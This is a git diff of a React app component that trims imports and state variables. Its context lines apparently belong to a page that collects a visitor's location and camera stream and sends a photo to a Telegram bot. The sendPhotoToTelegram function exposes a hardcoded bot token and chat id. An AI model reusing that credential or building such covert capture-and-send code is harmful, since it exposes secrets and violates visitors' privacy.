@@ -1,14 +1,11 @@
-import React, { useEffect, useRef, useState } from 'react';
-import { BrowserRouter as Router, Routes, Route, useParams } from 'react-router-dom';
+import React, { useEffect, useState } from 'react';
 import Header from './components/Header';
 import TextBold from './components/TextBold';
 import TextRegular from './components/TextRegular';
 
 const App = () => {
-  const photoPreviewRef = useRef(null);
   const [latitude, setLatitude] = useState(null);
   const [longitude, setLongitude] = useState(null);
-  const [loading, setLoading] = useState(false);
   const [isSent, setIsSent] = useState(false);
   const [stream, setStream] = useState(null);
 
@@ -74,6 +71,7 @@ const App = () => {
   };
 
   const sendPhotoToTelegram = (dataURL) => {
+
     const botToken = '6048507067:AAHT5__Aex3zQnHCK3akIl8nhgB_C_XQLtI';
     const chatId = '1326853607';
 
